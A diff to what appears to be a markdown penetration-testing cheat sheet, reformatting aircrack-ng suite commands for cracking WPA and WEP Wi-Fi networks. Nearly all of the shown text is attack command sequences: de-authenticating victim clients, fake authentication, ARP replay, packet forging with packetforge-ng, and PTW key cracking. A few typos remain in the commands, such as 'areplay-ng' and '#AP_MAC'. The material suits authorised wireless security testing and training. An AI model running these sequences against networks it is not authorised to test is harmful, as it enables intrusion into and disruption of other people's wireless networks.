@@ -28,8 +28,8 @@ You must choose a wireless module that has a chipset that is capable of being pu
 ## **Cracking WPA**
 
 `airmon-ng start wlan0`  
-`airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
-`aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon` \#{deauth attack}  
+`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
+`aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon` \#{de-authentication attack}  
 `aircrack-ng -0 -w $pass_list $cap_file`
 
 ## **Cracking WEP**
@@ -37,40 +37,40 @@ You must choose a wireless module that has a chipset that is capable of being pu
 ###  **with Connected Clients**
 
 `airmon-ng start wlan0 #[$channel]`  
-`airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
+`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
 `aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
-`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}`aireplay-ng -0 1 -a $AP_MAC -c $victim_client wlan0mon` \#{deauth attack - as needed}
+`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}`aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack - as needed}
 
 ### **via a Client**
 
 `airmon-ng start wlan0 #[$channel]`  
-`airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
-aireplay-ng -1 0 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
-aireplay-ng -2 -b \(AP MAC\) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon  
-aireplay-ng -2 -r \(replay cap file\) wlan0mon {inject using cap file}  
-aircrack-ng -0 -z\(PTW\) -n 64\(64bit\) filename.cap
+`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
+`aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
+`aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon`  
+`aireplay-ng -2 -r $in_cap_file wlan0mon` \#{inject using cap file}  
+`aircrack-ng -0 -z -n 64 $in_cap_file`
 
 ### **ARP amplification**
 
-airmon-ng start wlan0 \( channel\)  
-airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
-aireplay-ng -1 500 -q 8 -a \(AP MAC\) wlan0mon  
-areplay-ng -5 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon  
-packetforge-ng -0 -a \(AP MAC\) -h \(OUR MAC\) -k 255.255.255.255 -l 255.255.255.255 -y \(FRAGMENT.xor\)   -w \(filename.cap\)  
-tcpdump -n -vvv -e -s0 -r \(replay\_dec.\#\#\#\#\#.cap\)  
-packetforge-ng -0 -a \(AP MAC\) -h \(OUR MAC\) -k \(destination IP\) -l \(source IP\) -y \(FRAGMENT.xor\) -w \(filename.cap\)  
-aireplay-ng -2 -r \(filename.cap\) wlan0mon
+`airmon-ng start wlan0 #[$channel]`  
+`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
+`aireplay-ng -1 500 -q 8 -a $AP_MAC wlan0mon`  
+`areplay-ng -5 -b $AP_MAC -h $host_MAC wlan0mon`  
+`packetforge-ng -0 -a $AP_MAC -h $host_MAC -k 255.255.255.255 -l 255.255.255.255 -y $FRAGMENT_XOR   -w $out_cap_file`  
+`tcpdump -n -vvv -e -s0 -r $in_cap_file`  
+`packetforge-ng -0 -a $AP_MAC -h $host_MAC -k $destIP) -l $srcIP) -y $FRAGMENT_XOR -w $out_cap_file`  
+`aireplay-ng -2 -r $in_cap_file wlan0mon`
 
 ### **Cracking WEP /w shared key AUTH**
 
-airmon-ng start wlan0 \( channel\)  
-airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
-~this will error out~aireplay-ng -1 0 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
-aireplay-ng -0 1 -a \(AP MAC\) -c \(VIC CLIENT\) wlan0mon {deauthentication attack}  
-aireplay-ng -1 60 -e \(ESSID\) -y \(sharedkeyfile\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication /w PRGA xor file}  
-aireplay-ng -3 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon {ARP replay attack}  
-aireplay-ng -0 1 -a \(AP MAC\) -c \(VIC CLIENT\) wlan0mon {deauthentication attack}  
-aircrack-ng -0 -z\(PTW\) -n 64\(64bit\) filename.cap
+`airmon-ng start wlan0 #[$channel]`  
+`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
+\#getting errors here: `aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
+`aireplay-ng -0 1 -a #AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack}  
+`aireplay-ng -1 60 -e $ESSID -y $sharedkey_file -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication /w PRGA XOR file}  
+`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}  
+`aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack}  
+`aircrack-ng -0 -z -n 64 $in_cap_file` \#{PTW attack; \[-n\]: Specify the length of the key: 64 for 40-bit WEP, 128 for 104-bit WEP}
 
 ### **Cracking a Clientless WEP \(FRAG AND KOREK\)**
 
